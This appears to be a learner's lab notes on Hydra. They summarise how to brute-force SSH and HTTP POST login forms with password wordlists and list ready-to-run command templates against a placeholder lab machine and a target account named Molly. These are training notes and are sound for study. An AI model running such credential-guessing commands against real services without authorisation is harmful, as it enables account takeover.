# Hydra - [11-22-2026]

## What This Covers

This lab introduces Hydra, an online password-cracking tool used to test authentication services through wordlist-based brute-force attacks. It explains how Hydra automates password attempts against different network services and why weak or default credentials create security risks. I explored the protocols supported by Hydra and practised understanding its command-line options for targeting authentication services. The lab focuses on performing password attacks against SSH and HTTP POST login forms, including configuring usernames, password wordlists, thread counts, form paths, login parameters, and failure-response strings. I also learned how to identify whether a web login form uses GET or POST requests by inspecting browser Developer Tools and how to account for non-default service ports. Finally, I applied these concepts in the practical exercise by using Hydra to test Molly's web application login and SSH authentication on the provided lab machine, with the objective of recovering the two challenge flags.

* Understanding Hydra as an online password-cracking tool that automates authentication attempts using password wordlists.
* Understanding the difference between online password attacks and manually guessing credentials.

## Commands/Tools Used

```bash
# Installing Hydra on Ubuntu:
sudo apt install hydra

# Installing Hydra on Fedora:
sudo dnf install hydra


# FTP Password Testing:
hydra -l user -P passlist.txt ftp://MACHINE_IP


# SSH Password Testing:
hydra -l <username> -P <full_path_to_password_list> MACHINE_IP -t 4 ssh

# SSH Example:
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh


# HTTP POST Form Password Testing:
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V


# HTTP POST Form Testing with a Non-Default Port:
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V


# Common Hydra Options:

# -l  : Specify a single username
# -P  : Specify a password wordlist
# -t  : Set the number of parallel threads
# -V  : Display every password attempt
# -s  : Specify a non-default service port


# HTTP POST Form Parameters:

# http-post-form : Select the HTTP POST form module
# /               : Login page path
# username        : Username form parameter
# ^USER^          : Hydra username placeholder
# password        : Password form parameter
# ^PASS^          : Hydra password placeholder
# F=incorrect     : String indicating a failed login attempt


# Lab Environment:
http://MACHINE_IP

# Practical Web Authentication Target:
Molly's Web Login

# Practical SSH Authentication Target:
Molly's SSH Account
```
